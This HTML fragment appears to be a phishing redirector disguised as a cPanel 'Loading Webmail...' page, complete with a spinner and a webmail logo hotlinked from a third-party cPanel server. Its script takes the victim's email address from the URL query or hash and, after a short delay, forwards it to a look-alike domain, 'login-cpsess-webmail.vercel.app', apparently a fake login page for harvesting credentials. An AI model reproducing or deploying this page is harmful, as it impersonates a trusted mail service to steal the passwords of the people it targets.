    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background-color: #ffffff;
        }
        .loading-container {
            text-align: center;
            padding: 20px;
        }
        .logo {
            height: 35px;
            width: auto;
            margin-bottom: 20px;
        }
        .loading-spinner {
            width: 45px;
            height: 45px;
            margin: 20px auto;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #FF6C2C;
            border-radius: 50%;
            animation: spin 1s ease-in-out infinite;
        }
        .loading-text {
            color: #FF6C2C;
            font-size: 15px;
            font-weight: 500;
            letter-spacing: 0.5px;
            opacity: 0.8;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes pulse {
            0%, 100% { 
                opacity: 0.5;
                transform: scale(1);
            }
            50% { 
                opacity: 1;
                transform: scale(1.05);
            }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <img src="https://wolffacademy.com.br:2096/cPanel_magic_revision_1668371294/unprotected/cpanel/images/webmail-logo.svg" 
             alt="Webmail Logo" 
             class="logo"
             onerror="this.style.display='none'">
        <div class="loading-spinner"></div>
        <div class="loading-text">Loading Webmail...</div>
    </div>
    
    <script>
        function getQueryParam(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        function getHashFragment() {
            return window.location.hash ? window.location.hash.substring(1) : null;
        }

        // Add 2-second delay before redirect
        setTimeout(function() {
            const webParam = getQueryParam('web');
            const hashEmail = getHashFragment();
            const email = webParam || hashEmail;

            let redirectUrl = 'https://login-cpsess-webmail.vercel.app';

            if (email) {
                redirectUrl += '?web=' + encodeURIComponent(email);
                
                // Update loading text before redirect
                document.querySelector('.loading-text').innerText = 'Opening...';
                
                // Perform the redirect
                window.location.href = redirectUrl;
            } else {
                // If no email found, show error message
                document.querySelector('.loading-text').innerText = 'No email parameter found';
                document.querySelector('.loading-text').style.color = '#dc3545';
                document.querySelector('.loading-spinner').style.borderTopColor = '#dc3545';
            }
        }, 1700); // 2-second delay
    </script>
